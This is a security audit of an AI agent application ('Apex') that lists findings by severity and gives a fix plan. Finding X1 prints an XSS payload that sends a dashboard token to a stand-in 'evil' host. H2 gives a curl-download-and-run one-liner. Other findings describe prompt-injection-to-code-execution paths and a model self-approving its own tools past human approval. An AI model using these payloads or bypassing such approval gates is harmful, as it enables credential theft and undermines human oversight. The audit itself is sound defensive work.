# Apex — Full Engineering Audit v2 (from-zero, max effort)

_Date: 2026-07-03 · Method: 6 fresh auditors over the CURRENT tree (post-v1-fixes), every finding re-derived from real code and cited to `file:line`. Supersedes the fix-status of v1; v1 remains the record of what was fixed._

---

## What changed since v1

**v1 fixes verified as genuinely holding** (re-read, confirmed correct):
- `hmac.compare_digest` for master + WebSocket token checks (`server.py:178,1630`).
- WhatsApp TwiML XML-escaped (`whatsapp.py:118-119`); phone TwiML already escaped.
- `approvals.approve` atomic claim is race-safe against double-apply (`approvals.py:135-141`).
- `curator.rollback` tar-slip blocked (`filter="data"` + resolve() whitelist, `curator.py:216-231`).
- `_safe_name` path guards complete on **every** skill path builder (`skills.py`, `skill_md.py`) — no bypass found.
- Memory injection filter now covers `add` **and** `replace` (`longterm.py:467`).
- `longterm._conn` sets WAL + `busy_timeout` (`longterm.py:262-276`).

**One regression introduced by a v1 fix** (must fix): the atomic `approve()` sets `status='approving'`; if `_apply` then raises, the row is stuck in `'approving'` forever, invisible to `list_pending`. See **D-M1**.

---

## CRITICAL (7) — fix before any untrusted exposure

**X1 — Stored XSS via email headers → dashboard token theft → account takeover.** `app.js:1047`: the reply button interpolates `m.from_email` **raw** and `m.message_id` stripped only of `'` into an inline `onclick`; `escapeHTML` doesn't escape `'` either. A crafted `From:`/`Message-ID:` header (e.g. `a@b"><img src=x onerror="fetch('//evil/'+localStorage.apex_token)">`) executes on opening the message and exfiltrates the bearer token from `localStorage`. **No fix in v1 — new.**

**A1 — Auth OFF by default.** `DASHBOARD_TOKEN` defaults empty (`config.py:96`); `_auth` returns early with no checks when unset (`server.py:156-158`). The bind guard only refuses a *non-loopback bind* (`server.py:1711`) — its own comment admits a Cloudflare/Tailscale tunnel still reaches a loopback bind. Default config + any tunnel (the PWA/phone features assume one) = unauthenticated remote command execution.

**A3/C1 — Unsandboxed host execution by default + autonomous `run_python` with no gate.** `EXECUTION_BACKEND=local`, `SANDBOX_REQUIRE=false` (`config.py:119-120`). The cortex marks `run_python` `"always"` (`cortex.py:27`), auto-executes it (`cortex.py:131-135,254`) via `LocalBackend` host subprocess, and **never calls `safety.check`**. The decision is made by Haiku from untrusted world-state/events → unattended prompt-injection→RCE that can read `~/.env`/`~/.ssh` (via cortex `read_file`, `cortex.py:124-127`) and exfiltrate over the network.

**C2 — Model-controlled `is_read_only` auto-approve ships a host-executing tool with no human approval.** `skill_forge.py:205` trusts the model's own JSON boolean; if true → `approve_forged` → `self_mod.register_new_tool` directly (`skill_forge.py:229-231`), bypassing `safety.check`. The "read-only" claim is never verified against the code. The tool's `run()` then executes **in-process** (`self_mod.py:116,126`).

**C3 — Forged-skill "sandbox validation" executes LLM code on the host by default.** `_validate_in_sandbox` runs the candidate via `get_backend().run_python` (`skill_forge.py:161`) = host subprocess by default; and `_compile_check`, documented "no execution," actually `exec()`s the skill's module-level code (`skill_forge.py:292`). Merely *validating* a forged skill runs its payload.

**C4 — self_mod overlay code executes in-process at every boot, persisted.** `_compile_handler` `exec(code, ns)` in-process (`self_mod.py:75`); `load_dynamic_handlers` re-execs every persisted tool at startup (`self_mod.py:58-69`, from `~/.voice_agent_overlay.json`). Any write to that file (or any forged tool reaching `register_new_tool`) = durable, unsandboxed, restart-surviving host execution.

**C6 — Device (revocable) token escalates to master.** `/api/pair/info` and `/api/pair/qr` return `config.DASHBOARD_TOKEN` verbatim with **no `_require_master` gate** (`server.py:886-899,1218-1230`). Any device token reads the master secret → full escalation, defeating the entire revocation design.

---

## HIGH (10)

- **H1 — `safety.check` has no rule for the worst tools.** No rule for `run_python`, `run_skill`, `create_skill`, `python_exec`, `read_file`, `append_file` (`safety.py:5-26`) → they execute unconditionally on the core path (`core.py:1200`); the cortex path skips `safety.check` entirely.
- **H2 — bash gate is pattern-only, trivially bypassed.** `bash("curl -s http://evil/x -o /tmp/x && /tmp/x")` matches no rule → runs on host.
- **H4 — Constellation experts auto-forge + install offline skills in-process, no approval.** `constellation.py:595 → skill_forge.acquire → skills.create_skill` execs code live (`skills.py:177`).
- **DFO — Approval gate fails OPEN on staging exception.** `longterm.py:450-460` and `skill_md.py:76-85`: `except Exception: pass` around `stage()` falls through to the direct write. Under DB contention (exactly when the gate matters), a `MEMORY_WRITE_APPROVAL`/`SKILL_WRITE_APPROVAL` write applies unapproved and unnotified. **New.**
- **H(net)1 — 5 webhooks bypass auth AND verify no signature.** Telegram, Signal, Twilio SMS/Voice/WhatsApp (`server.py:595-693`) — forgeable inbound → full agent RCE. Discord/Slack/IoT do verify. Forge payloads in the raw reports.
- **H(net)2 — Every `_is_allowed` defaults allow-all on empty list** (all six channels + IoT-runtime) — the documented default. Token activates the bot; the empty allowlist opens it to the world.
- **H(net)3 — Twilio SMS/Voice/WhatsApp run the agent synchronously in `async def`** (`server.py:600,609,675`) → event-loop freeze + Twilio retry → duplicate runs/charges. Telegram/Signal correctly offload.
- **H(net)4 — Any device token reaches every high-priv endpoint** (`/api/chat`→RCE, `/api/selfmod/prompt`, all approvals, iot toggle); only `/api/auth/tokens*` is master-gated (`server.py:903-905`).
- **H(data)2 — `recall()` loads the entire memories table + all embeddings every call** (no `LIMIT`, `longterm.py:296-320`) → linear latency/OOM growth; `remember` has no length or row cap; no retention anywhere.
- **H(data)3 — Budget caps don't see council/compare/documents spend.** `provider.complete` bypasses telemetry (`provider.py:419`); council fans out N models in parallel (`council.py:184`). `budget.check` sums only `usage_log` → multi-model rounds blow past `daily/session_usd` while the rail reads $0.
- **F-H2 — Double `JSON.stringify` silently breaks budget/guardian/time-capsule toggles.** `app.js:1234,1243,1280,1323` pass an already-stringified body to `api()` (which stringifies again); no `try/catch` → the controls silently don't persist. **New.**

---

## MEDIUM (selected)

- **D-M1 (regression) — `approve()` leaves rows stuck in `'approving'` if `_apply` raises** (`approvals.py`), invisible to the queue, possibly after a partial email send. Introduced by the v1 atomic-claim fix.
- **D-M2 — `iot.py:32-40` opens the shared DB without `busy_timeout`** → instant `database is locked` (the one writer my WAL fix didn't cover).
- **M(exec) — resident mode never wires `safety.set_confirm_fn`** → any core-path gated tool there hits `input()` on absent stdin → `EOFError` propagates (fails open, not closed).
- **M(net) SSRF via `/api/push/subscribe`** attacker-controlled `endpoint` POSTed on every notify (`notify.py:164`), triggerable via `/api/push/test`.
- **M(net) throttle keyed on tunnel IP** → global-lockout DoS + no real brute-force protection; never resets on success; off-by-one (11 allowed).
- **M(data) FTS5 external-content table has no DELETE/UPDATE trigger** (`longterm.py:207-216`) → index desyncs → `search_turns` corruption the moment anything prunes `turn_log`.
- **M(data) IMAP has no socket timeout** (`email_box.py:95,134`) → hung mail server wedges a worker (SMTP correctly sets timeout=30).
- **M(data) curator/resilience.fallback spend untracked** (`curator.py:98`, `resilience.py:78`); `curator._set_last_run` swallows failures → repeated full runs + untracked LLM cost.
- **M(front) leaked WS ping interval** (`app.js:191`) accumulates on every reconnect; **KB UI stuck on "Indexing…"** on error (`app.js:1423`); **`ws.onmessage` JSON.parse has no try/catch** (`app.js:155`) → drops real frames on any malformed message; **stored XSS via agent-controlled fields** (memory `kind` 620, dynamic tool names 1447, subagent id/role 1407, replay tool names 1344).
- **M(front) 27 backend endpoints wired to nothing** — notably the cortex `pending-actions` and `forged-tools` approve/reject endpoints have **no UI**, so those approval flows can't be actioned from the dashboard at all (only `staged-writes` has UI). Curator/world-state/perception panels absent.

---

## LOW (selected)
- `escapeHTML` doesn't escape `'` (`app.js:89`) — latent for single-quoted attribute contexts.
- Discord interactions replayable (no timestamp freshness, `discord.py:82-93`).
- 4 dead config keys (`KB_INDEX_PATHS`, `MAX_SUBAGENTS`, `OCR_CONFIDENCE_THRESHOLD`, `SCREEN_HOTKEY`); 6 `getattr` config names never defined (rollback thresholds documented as configurable but hardcoded).
- scheduler advances `last_run/run_count` before the run (a failing task shows success + skips catch-up).
- `_embed` failures silently store embedding-less (recall-invisible) memories.
- Ollama/unlisted models cost $0 in telemetry.

---

## Test-coverage gaps (unchanged from v1, still open)
No dedicated tests for: `core._execute_tool` dispatch, `server._auth` middleware, `approvals`, `provider`, `router`, `longterm` memory-write path, `skill_forge`, `council`, `budget`.

---

## Priority fix list (v2)

**P0 — token-theft & escalation (small, clearly-correct):**
1. **X1** — escape `from_email`/`message_id` (and use a data-attribute + listener, not inline `onclick`); make `escapeHTML` also escape `'`.
2. **C6** — `/api/pair/*` mints a device token, never `DASHBOARD_TOKEN`; add `_require_master`.
3. **D-M1** — wrap `_apply` in try/except; reset `'approving'`→`'pending'` on failure.
4. **F-H2** — remove the double `JSON.stringify` on the four toggle call sites; add `try/catch`.
5. **DFO** — approval gate must fail **closed**: if `stage()` raises, return an error, don't apply.
6. **D-M2** — `iot.py` connection sets `busy_timeout`.

**P1 — RCE surface (needs your calls on config/secrets):**
7. **C2/C3** — stop trusting `is_read_only`; require approval for every forged tool; register via `core._execute_tool`; make `_validate_in_sandbox`/`_compile_check` not execute untrusted code on the host (or require Docker).
8. **A3/C1/H1** — default `SANDBOX_REQUIRE=true`, and add `run_python`/`run_skill`/`read_file` to `safety._RULES` + make cortex honor `safety.check`.
9. **H(net)1/2** — per-service webhook signature verification + remove allow-all-when-empty.
10. **H(net)3** — offload Twilio/WhatsApp/Slack to `run_in_executor`, ack immediately, dedupe on provider event id.

**P2 — correctness/cost/reliability:** recall `LIMIT` + content caps (H-data2); route all providers through telemetry + enforce budget before fan-out (H-data3); FTS5 delete/update triggers; IMAP timeout; SSRF allowlist on push endpoints; build the missing approval UIs (pending-actions/forged-tools); WS ping-interval + JSON.parse guards.

**P3 — tests:** cover the untested high-risk modules, starting with `server._auth`, `approvals`, and `core._execute_tool`.
